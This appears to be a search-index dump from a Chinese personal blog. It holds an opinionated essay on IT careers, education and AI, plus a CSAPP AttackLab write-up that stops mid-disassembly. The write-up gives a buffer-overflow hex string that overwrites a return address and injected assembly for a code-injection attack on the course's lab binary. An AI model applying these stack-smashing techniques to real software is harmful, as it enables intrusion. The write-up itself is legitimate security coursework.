\n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本次实验我们来优化一段计算多项式值的代码，并且亲自测量其性能，希望能加深同学们对机器特定优化的理解，同时为同学们提供测量性能的经验。\u003c/p\u003e\n\u003cp\u003e基本材料都引用于我校的CSAPP实验指导书页面。\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e预习：\u003c/p\u003e\n\u003cp\u003e我们先明确几个概念\u003c/p\u003e","title":"CSAPP:OptimizationLab","type":"csapp"},{"content":" 本期封面是《響け！ユーフォニアム》配角之一，中川夏纪，声音真的很好听，听说这个动漫到《利兹与青鸟》就完结了来着（？）\n关于IT行业的看法（IT另解笔记） # 学历在CS的行业不会成为任何优势（但是它重要），过硬的技术和能力才是，记清楚这一点，才不会盲目。请勿再将未来的希望寄托在你所在的学校身上了，你的一切，你的兴趣，都要自己费力去追寻\u0026hellip;\u0026hellip;\nCaution!本篇博文是强烈带有主观意见的意识流笔记，并且部分观点可能跟不上时代（2021年），因为我们的国家每天都在大步前进口牙！！！并且不代表笔者的全部观点，但是希望能对于在校的尚对于目标不明确的学生带来一些帮助，视频来源（https://space.bilibili.com/19658621），顺带推荐一下他的C语言视频，如果你还没有学过，或者已经工作但是有进一步理解的需要，学习一下这个视频，会颠覆你对于POP编程的认知。\n要明确的几个点 # 专业不是职业。\n比赛有什么用？没用\n企业合作类比赛 （目的是为了赚钱）\n对自己有没有提升 占不占时间\n不耽误时间 顺带拿奖可以去\n关键是通用技术的掌握 进实验室？为优秀的学生提供好的资源\n自行斟酌！！！ACM大赛（高中没学过，感觉大学很难融入，人家一开始就形成小圈子，要么就是你一开始就真的很感兴趣，然后花大量的时间去学习相关内容，也可以）\n教育的目的不是诺奖，体育的目的不是金牌。\n切莫相信个人的经验判断：\n没有人可以被模仿 人只能塑造自己的人生\n人只能关注自己的人生\n如果绩点都变成了一种值得骄傲与吹嘘的东西，那么，你的大学都学到了什么，你和备战高考的高中生又有什么区别，搞清楚这一点，学到东西，理解到东西，别你绩点高的人，在对于知识的理解上，可能还远远不如你。（这是真的）\n少听故事 多听现实和分析问题的方法 少关注别人的经历\n没有人能够准确地预测未来。\n对于后端程序员来说，计算机网络以及操作系统的理论是否重要。（应对面试）\n操作系统理论：尽可能去理解，值得深度学习。（深度了解操作系统）\n（数据结构本后的本质）\n教材只具有参考的意义，只有辅助的作用。看论文，有突破性的操作系统，前沿，作为后端的底盘。\n大二大三，实习？ # 校园招聘，针对于实习生（Microsoft，Google）申请实习，尽可能走校招（因为我没有什么经验） 社会招聘：有经验的人。 项目是很难的，产品，设计师，用户，开发流程，团队协作精神。。。项目有多少人在用？迭代版本？（工作当中的实际问题，开发的过程，称之为项目和经验，进入企业，才算社会的经验。）\n校园招聘： 良好的通用技术基础。\n\u0026amp;实习生入职一般会被分配什么样的工作。（技术底层越强，任务越核心）\n大厂 中小厂（有可能直接安排到核心职位，有可能没有考核）\nPS: 普通编程任务 小模块 （协作开发）目的：了解公司的开发流程\n培养实际项目经验 技术支持类（协助测试）\nIT类出国学习 # 要不要留学？经济基础 美国太贵 日本 新加坡 英国1.5年（50W）\n不错的经历 留在外面，能不能拿到国家的绿卡？被迫回国。\n奖学金 保研 值不值得？ # 能拿就拿，拿不了拉倒。 （目标是为了获得知识）\n保研 概率问题 不要盲目追求 真正需要研究生的人不需要保研，为什么保研？\n没有清楚自己的人生目的，我不知道研究生有什么用，先保研吧？？？\n自己不知道自己在干什么，嫉妒心，想尽办法争取保研的名额。争取攀登更高山峰的人，反而更能留下保研的可能，有目标的人，不会拘泥于此。\nIT行业的学历重不重要 # 学历很重要，能力很强，不需要学历（另说）\n有着学历的下限就可以（本科）技术上限\n工作好，是因为进的企业好，不是因为学历高。在什么公司担任什么样的工作，薪资和工作不是由学历决定的，是由公司决定的。\nIT技术的发展迭代问题 # 进化论，自然选择学说，没有什么东西是绝对稳定的，没有绝对稳定的工作。\n按键机——》触屏手机 国产手机 全部 系统基于Android系统\n（包括鸿蒙（Harmony OS）系统，基于Android系统，因其开源）\n渐变式的进化 对于技术来说是一样的 Microsoft Typescript基于Javascript\n所以要学习通用技术。（java py go c?）都是工具而已，类似物种间的竞争。\n都是面向对象的思想\n（误区：最多的东西不一定是趋势，很少人能够预料到趋势，流行不是趋势。）\nInter IMD Microsoft和Mac OS 滚轮不相同，形成差异化。C#\n物种的分化，苹果电脑-苹果-Mac touch-。。。\n所有的物种都会灭绝和衰落，不存在绝对稳定的工作与技术 机组原理 数据结构等等都短时间内难再有突破\n谈一谈Python # 不要想着一门语言就能找到工作。（2021年的形势）\n什么样的人去学：非计算机专业，会计\u0026hellip;\u0026hellip;\n人工智能是一个学科，其中的诸多框架是由C++实现的，python也只是写了一些脚本。CS学的东西相当多，语言只是一个工具，语言不是学科。大数据中最多的是java，人智最多是C++，数据分析JS，大脑是不限制语言的，语言也不能和职业扯上关系，主JAVA后端，主GOLANG后端，和职位有关，语言不能决定任何事情，不要纠结语言，不要纠结框架，库，算法底层，数据结构，架构，解决方案，软件构件，编程的艺术！！！（从低到高的一种程序员的排序）\n炒的很火，广告，培训机构，少儿编程。。。（钻石的价格为什么贵）\n解析性语言，2021年，python不好找工作对于开发人员来说，Python web，性能远远低于上述的语言，尤其不适合并发的项目，不是最优选择，容易出现性能问题，需要的岗位有但不多，认识清楚这样一点。\n如何跟进技术迭代 # 关注技术趋势的发展（元宇宙？）\n人工智能未来几年要解决的问题，前端（微前端）关注全球的会议\n国外的期刊之类，重要技术的迭代，培训，投资学习\n与行内业界认识专家合作，了解不同见解？云计算（尚早）\n利用开源社区 GitHub。。。使用的技术尽可能符合趋势发展\n（足够好的英文） 雅思6.0\n考试和实际应用的差异，研究考试。\n技术的目标：更快，更容易使用，更便宜。\n硬件的目标：更加小巧，便于使用。\n人工智能是否能够取代人类的工作 # 基本是完全是可能的，取代是趋势，包括程序员的工作。\n尽可能去追求艺术性的生活，在人工智能取代人类工作的时代，（人应该去享受幸福的生活与创作？） 目前人工智能处于停滞的状态，目前没有替代的能力，没有同理心判决的能力。\u0026mdash;李开复\n艺术的创作，基于个人主义（AI作画） 人类的发展基于人类的个性，人工智能不具备个人意识的能力（目前的情况）。\n人类社会的本质是为了文明的延续，不报乐观或者悲观的心态，基于客观的事实。（科学是将目光真切的看向每一个人）\n计算机系考研问题 # 人不可能攀登他不知道的高峰，还是明确的目的。很多人考研，保研是没有目的的行为，先考个研究生吧，不知道未来想干什么。\n大学生要有自我思考的能力，不能一味的跟风，寻找自己的目标，打开窗子看一看。多自己分析现实情况，问的人应当是自己理想的职位，请教正确的人，才可能获取正确的指导。（你应该干什么，你去干什么？？？老师学长学姐？？？）\n这个世界上没有学习能力的人都去当老师了。\n根据职业来决定，中国开设人智的大学就几个，该领域还是相当差。\n实事求是，不如别的国家。\n现在有了DeepSeek，但是我还是请大家仔细思考，这和我们对于道路的选择有什么关系？\n非群体判断标准 # 上了研就一定会走另一条道路吗?是否考研，成为什么样的人，都取决于自身的情况，而不应当考虑一个集体，我们都只是一个个体，我们不应当成为这样的集体中的一份子，不会因为选择什么，就会成为什么，我们应当基于个体的逻辑分析，我们有没有达到自己想要的岗位的学历的下限，从而去上研，应当学会抉择，而不是盲目的从大流。\n大学社团\n有没有参加的必要，参加了，应当以怎样的眼光看待？交流交往。谈个恋爱？？\n辩论社，音乐，美国化学学会。用处不是很大，主要取决于大学。毫无意义的学分增值，那便没有什么意义。太耗费时间，严重影响学业的话，显然。什么都做，最后可能啥也不是。。。具有很强的竞争气氛，缺乏包容心。。。\n根据自身的情况合理判断吧。\n当学校的培养方案与自己的目标冲突时\n不要漫无目的的卷，那就自己学，没有人歧视你是不是这个专业，没人管你，专业和职业是两个东西，没人在乎你以前是什么专业，只会管你有没有良好的工作能力。\n只有我们自己在乎自己过去不堪入目的往事，没人会记得。 有很多转职业专业者。\n外企 英语 面试题 刷题 # 要看具体的职位，外企待遇也不一定好，根据你想不想去。\n英语，具体情况具体分析，最低雅思6.0，作为最基础的英语水平，尽力去达到。\n忙冲算法？成为算法工程师，技术没有上限，天天刷题，不会进大厂(储蓄不能让人富裕)，最为愚蠢的行为，刷题只能证明你会刷题，不代表你会干活！\n(解释一下什么是操作系统？什么是多道任务？什么是资源管理？你是如何理解设备管理的？解释什么是进程，什么是线程，二者有何区别？进程和线程的实际应用？如何理解存储管理，内存管理，文件系统？解释什么是进程同步？什么是通信？如何理解信号量，消息队列，共享列成？什么叫调度策略？FCFS？STN？什么叫时间片轮转？PR？)？？？？？？？？？？？？？？？？？？？？显然，刷题无法解决这类问题？\n（进程是计算机当中程序的一次执行过程，拥有独立的内存空间，系统资源，线程是进程当中的一个执行单元，共享进程的系统空间和内存资源。应用：多任务处理，并发进程。）\n（内存管理:确保系统有足够的内存可运行程序，避免内存浪费。）\n（文件系统：存储数据的逻辑结构，负责文件的管理存储，负责文件的读写和修改。）\n(进程通信：进程之间传递信息的过程。同步。解决并发问题重要手段。)\n回答问题要有所准备，自己不理解的不要说。不要相信刷题就能进大厂，理解基础知识，有诸多开放性的话题，企业文化。\nAI专业与ACM # 根据自己的情况参加 ACM大赛组 校园招聘是一个加分项，但是并不重要，先要满足必要的要求。（找工作的角度）\n提升阅历的方式，是否愿意牺牲时间去参加这样的学习，自己的学习能力怎么样？鱼和熊掌不可兼得。。。时间有限，不可能什么事情的做好。重在参与是胡说八道，关键是自己要不要参与。空余的时间拿来干什么，自己能不能赢，如果没有赢的机会，那为什么要浪费时间参加。确定目标不要疏忽学业，保研？提升机会，选概率大的东西。区分清楚是锦上添花还是本末倒置。\n蓝桥杯：（报名费400元）有国家工信部撑腰，投了很多钱，背景很硬，参加的人越多的比赛越水，什么人都有。。。视自身情况而定，赚钱还是在搞教育。不要毕业了什么都不会，只会比赛，找实习没人看你拿了什么杯，我们中国人搞了这么多年比赛，获得了什么，只是许多证书，没有什么瞩目的成就，好的公司。搞教育的人都消失了，大家都去捞钱了，你获奖了，老师是分红利的，（一般的大学校，是分赃分利的地方），大部分大学老师，整天浑浑噩噩，等着捞国家红利，让学生们相信什么什么有用，优秀的老师不会整天让你干这干那，你应当干你自己喜欢的事情，追求自己的理想，人应当有认知真理，发现真相的能力，如果你真的喜欢ACM，那你就去干（前提是基础课学的不错哦），不要鸡汤喝得太多，鸡血打的太猛，\nChatGPT主题 # 人类总是害怕那些他们不能理解的事物。——辛德拉\n语言训练模型。小说科幻电影，都以艺术形式呈现，其目的是为了表达人的思想，并非事实。基于事实依据来分析，具体的逻辑。历史和神话的差距，科幻不等于事实。没有什么东西能够轻易的取代一个人，这种工具用于提升人的效率。人工智能只能让人更加有效率的完成任务，没有办法取代人的核心。咖啡师，采矿业等等普通的职业面临的危险，取代，取代的是人的行为，并非人本身。创作很大程度上还是要依赖人类，创作不是模仿，而是去创造新的东西，没有自我意识，训练模型的观点都来自于人类，并无创作的意识。\n计算机细分领域以及生态整合 # 软件开发，设计，编程，维护，测试，架构。 网络，建设维护，操作系统 数据库，设计开发维护三大类 人工智能，机器学习（探索阶段）-数据库-软件工程-语言训练模型（GPT） 嵌入式，嵌入系统，汽车，家电 网络安全，免受未经授权的访问 虚拟现实VR 信息安全 软件测试，售后 数据分析，大量数据提取有用的信息，支持决策，未来趋势-数据库 云计算虚拟化，允许将计算和存储资源从物理基础设施中抽象出来 学科交叉发展，很凌乱的，劳动分工，动态的社会，都在发挥各自的价值\n出国，自己去判断\n认知 决心 对自己的发展好不好？上述二者要达到平衡，金钱也只是其次的。。。\n程序员外包是什么以及为什么大多数人不推荐外包 # 软件开发交给外部的公司，接活干的公司，外包公司，这样的公司很累，员工很难受。节省成本，具有灵活性。-沟通协调的问题-打架，控制与质量问题，技术，进度，创意，不受控制。知识产权的丢失，有潜在的问题，也有合理之处。\n大学生要不要做兼职和搞外快\n家庭是否困难，根据条件来看，绝大部分人没有这样的需求，不要效仿别人赚钱，竞争力市场，根据需求，不能影响我们的主线任务的进展。\n职业的可转变性与避坑\n过了几年，岗位就没有了，失业了。\n小众的职位，假设一门技术X，也有可能是一门语言，存在一种可能，赌对了，有可能获得利润，有自己的前途，赌错了，即刻失业，Node.js近年来便引领了趋势。可能会带来致命的伤害，尽量去选通用的职位，大众的职位，有没有赌本？？？\n专用性程度 完全专用性 专用性程度：java golang 数据结构与算法 Linux 都有其专用性，其本身是具有多样性的。用于诸多的职位上。当有东西落寞的时候，你可以随时转型。\n完全：ios系统 VB（微软搞得）这样的技术要小心，只有一个针对点。\n！！微信小程序！！有可能生成了一种主流，但是要保持警惕。这样的赌注对你来说值不值得？\n一个要素的专用性越小，那么它从一种用途到另一种用途的可转变性就越大。JAVA并非针对某一种产品研发的语言。\n完全专用性在价值变动方面造成的影响要远远大于专用性程度造成的影响。\n学习记笔记的方法与心得 # IT要不要记笔记，怎么记笔记，有用，但看怎么记笔记。传统教育的问题，台上PPT，书本上学习的知识，笔记起到梳理的作用，笔记不是给自己看书法，争取起到有效的作用，尽量简洁，如果文字太多，尽量迅速筛选信息，纸质翻阅可能较为麻烦，自己看不懂，两个字，争取有效，可以尽量记到计算机上，打字比写字更快，不一定非要跟上时代的潮流，但是如果有效率更高的方法，那就去做。可以用Ipad，在PDF上标注，你要有需求用到它，而不是先去买这个东西。\n关于必修课，上课老师是不是按照这个教科书来的，搞清楚这一点，注意分配好自己的注意力。文综类的课程，关键点，经济学原理，这样的东西应当学会浓缩，听清楚这样一个点，听清楚要讲一个什么主题，什么观点，什么论点，关键证明手段。你记笔记的最好时间，厘清思路的最好时间，就是老师吹nb的时候。\nD define 关于这样的一个定义，是重点。这节课的点是什么，这节课讲述的结构是什么，建立起来逻辑，思维和记忆就会变得清晰，举了什么样的例子，也是十分重要的内容，我记笔记，是为了搞清楚结构和逻辑，而不是说，你一直抄我们书上有的内容与知识，这显然没有意义，我听了二三十分钟欧拉图，居然没有先建立欧拉图的具体概念，那你上课就是听天书。\n博客，博客是给别人看的，笔记是给自己看的，给自己梳理东西的，勾勾画画只有自己能看懂，不要浪费自己的时间，你看看之前的杰作，有许多人记笔记自己不好好看，那就没有任何的意义，你给别人看，就是要搞得谨慎一点，二者有着明显的区别。多多写对于自己的笔记和心得，自己应该在哪里更加注意，不要去记常识性的，一般性的东西，总之，我们说讲究一个，高效，实用，讲求逻辑。。。\n我们良好的一个状态，是说我们记的笔记越来越少，而学习的速度越来越快。\n引用自原博主动态：\n动态：新的开学季。 初高中：现在知道学历有下限了吧？ 大一：搞好生活，适应大学环境，搞懂大学的套路，不逃课、不早退、及时交作业就意味着平时分过了。学习、生活、社交、活动、比赛\u0026hellip;几头抓的，最后肯定很惨。大一刚开学搞明白大学生活，照顾好自己就足够了。 大二：一年过去了，大学生活和照顾自己都没问题了，已经摸清楚上课、活动、社交等各种逻辑，接下来就该考虑自己职业问题，是做什么？什么方向？什么领域？什么具体职位呢？尽可能无视各种社交活动，无视大学任何比赛，无视大学所有的战略培养计划，无视大学教师和学姐学长的建议，无视学习路线。把精力放在追逐具体职位的共性技术上，这一点我们在IT疑问点已经讲得十分清晰，愿能为你们节省数年时间，互联网信息繁杂，此方法可以避开各种坑。 大三：你应该已经处于追逐职业生涯的半路上了。专科的学生如果能升本科最好不过，本科的学生根据自己的职业需求来升级学历，最低下限学历是存在的，但不存在高学历的上限。如果扫厕所，可能需要初中学历，你已经满足，所以不要傻了吧唧的往前考，没有意义。除非是有意义的考，有些职位在行业里就要求博士，那你必须得考，除此之外白费功夫。 大四：实习，面试。面试才是最好的检验方法，除此之外，没有任何技术和方法能够检验你是否可以就业的水准。去吧，一定要去大城市，小城市是没有就业的：北上广深杭。五个都可以选。如果校招给力，建议走校招；如果你给力，直接去大厂官网应聘。 不论如何，对于技术的培养唯有持续不断地摸索与训练，而非单纯的计划与追踪。\n谈谈中国游戏开发 # 喜欢打游戏，没有经历过什么是游戏的开发。一个团队热爱开发游戏。R星 GTA5 荒野大镖客 RIOT games LOL 为创造游戏而生，体验开发游戏的艰辛，也体验开发游戏的成就。\n游戏的本质是软件，开发游戏不代表编程，C/S架构，不完全是，需要图形和渲染（游戏渲染引擎），\nUnity3D 美工 艺术视觉设计 数字媒体 在引擎中训练 编写成庞大的系统 服务器（后端）\n反作弊系统（安全开发工程师） 编剧 导演 设计师。。。牵扯了大量的职位\n独立开发者，光明记忆真的是一个人做的么？想要成功，一定要合作，认真去找。\n任何天才，都不能在孤独的环境中发展。\n打字训练 # 推荐网站：Typing club 网站 多加练习 Qwerty learner 多加练习，每天都练习，会有极恐怖的进步。。。\n谈谈数据结构使用代码实现 # 计算机中存储，组织数据的方式，用什么样的语言实现不重要，目前的教学方式就是用垃圾的代码去实现垃圾的数据结构，不理解数据结构的实现原理，而去看代码来理解。\n正确的数据结构可以提高算法的效率。Pop oop 都能实现，但方式明显不同，不要关注语言，语言来的快，去的也快，因为市场是多变的。了解底层。\n作业做不了，是因为语法不够熟练。（for嵌套，递归？这样的作业）\n计算机语言的共性，软件工程的一些术语 # 流程控制：循环，条件判断（控制结构），子函数（方法Java）\n我们所做的一些基本题，都是围绕着if for来进行的。重要的是一种感觉，用什么东西去处理，需要大量的练习，用什么语句，要几层的循环，要在纸上多写一写思路和结构，先想清楚，效率才会明显提升。。。。。。\n定时，效率 进行算法的练习\n结构化处理\n結構化的非區部控制流程\n有些程式語言會提供非區部的控制流程（non-local control flow），會允許流程跳出目前的程式碼，進入一段事先指定的程式碼。常用的結構化非區部控制流程可分為條件處理、异常处理及計算續體（Continuation）三種。\n异常处理：在编程语言领域，通常 例外（英語：）这一术语所描述的是一种資料结构，该資料结构可以存储异常（exceptional）相关訊息。例外处理的常见的一种机制是移交控制权。引发（raise）异常，也叫作抛出（throw）异常，通过该方式达到移交控制权的效果。例外抛出后，控制权会被移交至某处的接（catch），并执行处理。\n（比如C语言下标的越界）\n计算机续体：创建了一个全局的变量，未来在某个控制流中使用它，感觉是提前定义了一些东西。\n竞争 # 竞争的实质。做自己的第一名，产生特色，竞争的赢家只有第一名和第二名。你活在什么样的幸福里，父母给你摆平的路，给你营造的氛围，给你某某的规划，或者沉浸于学校好的骄傲感中，或者是什么实验班的就业计划\u0026hellip;\u0026hellip;\n务实与态度 # 年轻人要讲求务实，不能认为自己参加了一个什么比赛，获得过什么奖就能跨越一个阶层，你去面试外企，别人不会注意你比赛第几名，拿了什么奖，一点：你能不能帮公司解决这个问题，难道提升我们的教育水平，只能用比赛？？？这样的教育令人感到心寒。我们中国人喜欢比赛，宣传，形式主义，我们太在意表面现象，而不去追究深层次的问题，不追求深层次的东西，IT这个行业，我们是干不下去的，你想当什么样的人，你想干什么样的事，比狗p什么比赛更重要，不要认为只要你参加某某比赛，就能。。。我只要。。。就能。。。？？？此等幻想，同样应当干掉。能爬上去，一定是通过自己的努力，觉得学历不够，就去考。\n你选了一个自己不喜欢的专业，但是还能坚持学下去，并且当成乐趣，这就是tmd态度。你来学校是干嘛的？学习起来太费劲，高考好不容易完事儿了，为什么还要学习？觉得要学习的东西就像大海一样多，我怎么才能掌握这么多东西，我什么东西都要会，因此而迷茫。\n“做什么事情，不管是否是你想做的，既然你去做了，就把它做好，不管是不是你想象的样子，尝试去热爱它。”——态度\n你对真正想要做的事情有没有爱。\n“我心尽在此作。”\n面试 # No Job Is Perfect! 这里我认为还不重要，因为我们大多还是实习生（作为一个大学生的话），面试就是大量的实战并且积累经验，前提是你有足够扎实的底层知识。\n谈谈你的简历？\n目的：不是列举成就以及职责，想要一个重点突出的内容，这个职位为什么适合你？\n目的是阐述关联度，展示清晰的职业目标，你在哪里干了什么有特色的事情（20%缓存时间减少\u0026hellip;\u0026hellip;），是适合这个岗位的。\n明确过渡：离职的原因？（好好解释，没上班的时间怎么保持跟进技术的迭代）突出专业的声誉，要是有战略性的步骤。\n裁员：公司改变了策略。\n强调技能的不断提升，最好两三分钟结束。\n","date":"21 March 2025","externalUrl":null,"permalink":"/thinking/itsolving_problems/","section":"Thinking","summary":"\u003cblockquote\u003e\n\u003cp\u003e本期封面是《響け！ユーフォニアム》配角之一，中川夏纪，声音真的很好听，听说这个动漫到《利兹与青鸟》就完结了来着（？）\u003c/p\u003e\u003c/blockquote\u003e\n\n\n\u003ch1 class=\"relative group\"\u003e\u003cstrong\u003e关于IT行业的看法（IT另解笔记）\u003c/strong\u003e \n    \u003cdiv id=\"%E5%85%B3%E4%BA%8Eit%E8%A1%8C%E4%B8%9A%E7%9A%84%E7%9C%8B%E6%B3%95it%E5%8F%A6%E8%A7%A3%E7%AC%94%E8%AE%B0\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%E5%85%B3%E4%BA%8Eit%E8%A1%8C%E4%B8%9A%E7%9A%84%E7%9C%8B%E6%B3%95it%E5%8F%A6%E8%A7%A3%E7%AC%94%E8%AE%B0\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003e学历在CS的行业不会成为任何优势（但是它重要），过硬的技术和能力才是，记清楚这一点，才不会盲目。请勿再将未来的希望寄托在你所在的学校身上了，你的一切，你的兴趣，都要自己费力去追寻\u0026hellip;\u0026hellip;\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCaution!本篇博文是强烈带有主观意见的意识流笔记，并且部分观点可能跟不上时代（2021年），因为我们的国家每天都在大步前进口牙！！！并且不代表笔者的全部观点，但是希望能对于在校的尚对于目标不明确的学生带来一些帮助，视频来源（https://space.bilibili.com/19658621），顺带推荐一下他的C语言视频，如果你还没有学过，或者已经工作但是有进一步理解的需要，学习一下这个视频，会颠覆你对于POP编程的认知。\u003c/strong\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\n\n\u003ch2 class=\"relative group\"\u003e要明确的几个点 \n    \u003cdiv id=\"%E8%A6%81%E6%98%8E%E7%A1%AE%E7%9A%84%E5%87%A0%E4%B8%AA%E7%82%B9\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%E8%A6%81%E6%98%8E%E7%A1%AE%E7%9A%84%E5%87%A0%E4%B8%AA%E7%82%B9\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003e专业不是职业。\u003c/p\u003e","title":"IT:Solving_Problems","type":"thinking"},{"content":" \u0026ldquo;What kind of path are we walking on?\u0026rdquo;\n","date":"21 March 2025","externalUrl":null,"permalink":"/thinking/","section":"Thinking","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u0026ldquo;What kind of path are we walking on?\u0026rdquo;\u003c/strong\u003e\u003c/p\u003e\u003c/blockquote\u003e","title":"Thinking","type":"thinking"},{"content":" 本期封面是动漫《Girls Band Cry》的主角团一行人参拜时的场景。\nCSAPP:AttackLab # [!WARNING]\n通过本实验，你将学习到利用安全性漏洞攻击操作系统和网络服务器的方法。本实验的目的是通过模拟攻击来增进对安全漏洞的理解和防范意识，了解安全漏洞的本质。本实验内容应仅用于学习目的，严禁用于任何非法或不道德的活动。 本实验开始前，需要学习CS:APP3e第3.10.3节和第3.10.4节的知识。 https://arthals.ink/blog/attack-lab 你还是可以参考这位的博客。 scp -p -r 2236115135-ics@x86.ics.xjtu-ants.net:./attacklab-2236115135-1235135 ~/ //scp下载远程服务器上的文件，如果要本地开发这是好的办法 前三层是CI（代码注入攻击）攻击，后两层是ROP（返回导向编程）攻击。\n代码注入攻击（Code Injection Attacks） # phase1: # 0000000000401a90 \u0026lt;test\u0026gt;: 401a90:\t48 83 ec 08 sub $0x8,%rsp ; 分配了八个字节的空间 401a94:\tb8 00 00 00 00 mov $0x0,%eax 401a99:\te8 31 fe ff ff call 4018cf \u0026lt;getbuf\u0026gt; ; 调用了getbuf函数 401a9e:\t89 c2 mov %eax,%edx 401aa0:\tbe e8 31 40 00 mov $0x4031e8,%esi 401aa5:\tbf 01 00 00 00 mov $0x1,%edi 401aaa:\tb8 00 00 00 00 mov $0x0,%eax 401aaf:\te8 3c f2 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 401ab4:\t48 83 c4 08 add $0x8,%rsp 401ab8:\tc3 ret 00000000004018cf \u0026lt;getbuf\u0026gt;: 4018cf:\t48 83 ec 38 sub $0x38,%rsp ; 分配了56个字节的空间（在buf里） 4018d3:\t48 89 e7 mov %rsp,%rdi 4018d6:\te8 7e 02 00 00 call 401b59 \u0026lt;Gets\u0026gt; 4018db:\tb8 01 00 00 00 mov $0x1,%eax 4018e0:\t48 83 c4 38 add $0x38,%rsp 4018e4:\tc3 ret 00000000004018e5 \u0026lt;touch1\u0026gt;: 4018e5:\t48 83 ec 08 sub $0x8,%rsp 4018e9:\tc7 05 2d 2c 20 00 01 movl $0x1,0x202c2d(%rip) # 604520 \u0026lt;vlevel\u0026gt; 4018f0:\t00 00 00 4018f3:\tbf 22 31 40 00 mov $0x403122,%edi 4018f8:\te8 53 f4 ff ff call 400d50 \u0026lt;puts@plt\u0026gt; 4018fd:\tbf 01 00 00 00 mov $0x1,%edi 401902:\te8 92 03 00 00 call 401c99 \u0026lt;validate\u0026gt; 401907:\tbf 00 00 00 00 mov $0x0,%edi 40190c:\te8 bf f5 ff ff call 400ed0 \u0026lt;exit@plt\u0026gt; 我要把return的地址覆盖成上面的touch1函数的首地址以执行touch1函数。\n那么直接构造如下的输入字符串即可，记得使用hex2raw工具。\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e5 18 40 00 phase2: # 这里的操作就是：1.同理覆盖地址。2.你要传一个参数来执行你的代码。\n我要把覆盖的地址变成touch2,同时要传参数。\n0000000000401911 \u0026lt;touch2\u0026gt;: 401911:\t48 83 ec 08 sub $0x8,%rsp 401915:\t89 fa mov %edi,%edx 401917:\tc7 05 ff 2b 20 00 02 movl $0x2,0x202bff(%rip) # 604520 \u0026lt;vlevel\u0026gt; 40191e:\t00 00 00 401921:\t39 3d 01 2c 20 00 cmp %edi,0x202c01(%rip) # 604528 \u0026lt;cookie\u0026gt; 401927:\t75 20 jne 401949 \u0026lt;touch2+0x38\u0026gt; 401929:\tbe 48 31 40 00 mov $0x403148,%esi 40192e:\tbf 01 00 00 00 mov $0x1,%edi 401933:\tb8 00 00 00 00 mov $0x0,%eax 401938:\te8 b3 f3 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 40193d:\tbf 02 00 00 00 mov $0x2,%edi 401942:\te8 52 03 00 00 call 401c99 \u0026lt;validate\u0026gt; 401947:\teb 1e jmp 401967 \u0026lt;touch2+0x56\u0026gt; 401949:\tbe 70 31 40 00 mov $0x403170,%esi 40194e:\tbf 01 00 00 00 mov $0x1,%edi 401953:\tb8 00 00 00 00 mov $0x0,%eax 401958:\te8 93 f3 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 40195d:\tbf 02 00 00 00 mov $0x2,%edi 401962:\te8 f4 03 00 00 call 401d5b \u0026lt;fail\u0026gt; 401967:\tbf 00 00 00 00 mov $0x0,%edi 40196c:\te8 5f f5 ff ff call 400ed0 \u0026lt;exit@plt\u0026gt; 过程：覆盖调用函数的返回地址来执行我的代码（这相当于是在stack上执行我的代码，你想这要怎么做到？把ret要覆盖的地址设置成分配之后的rsp的值，那么rip便会从这里开始执行代码，我们再将代码放进缓冲区，好妙的攻击技巧），我的代码把%rdi设置成我的cookie值，并且通过ret指令返回到touch2函数执行。\n在getbuf分配完了栈空间之后，%rsp = 0x5563c8d8,这也就是缓冲区的起始地址。\n我们构造：\nmovq $0x14e6646f,%rdi ; 把第一个参数设置成cookie值 pushq $0x00401911 ; 这里push进去一个touch2的首地址值 ret ; ret实际上就是把刚刚push进去的值拿出来然后跳转执行 // gcc -c asm.s // objdump -d asm.o \u0026gt; asm.byte 我们拿到这段汇编指令的字节码 phase3: # 还是传参，但是会更麻烦，要调用更多的函数来解决这个问题,我要把我的cookie值作为一个string传给touch3。\n0000000000401971 \u0026lt;hexmatch\u0026gt;: 401971:\t41 54 push %r12 401973:\t55 push %rbp 401974:\t53 push %rbx 401975:\t48 83 c4 80 add $0xffffffffffffff80,%rsp 401979:\t89 fd mov %edi,%ebp 40197b:\t48 89 f3 mov %rsi,%rbx 40197e:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401985:\t00 00 401987:\t48 89 44 24 78 mov %rax,0x78(%rsp) 40198c:\t31 c0 xor %eax,%eax 40198e:\te8 bd f4 ff ff call 400e50 \u0026lt;random@plt\u0026gt; 401993:\t48 89 c1 mov %rax,%rcx 401996:\t48 ba 0b d7 a3 70 3d movabs $0xa3d70a3d70a3d70b,%rdx 40199d:\t0a d7 a3 4019a0:\t48 f7 ea imul %rdx 4019a3:\t48 01 ca add %rcx,%rdx 4019a6:\t48 c1 fa 06 sar $0x6,%rdx 4019aa:\t48 89 c8 mov %rcx,%rax 4019ad:\t48 c1 f8 3f sar $0x3f,%rax 4019b1:\t48 29 c2 sub %rax,%rdx 4019b4:\t48 8d 04 92 lea (%rdx,%rdx,4),%rax 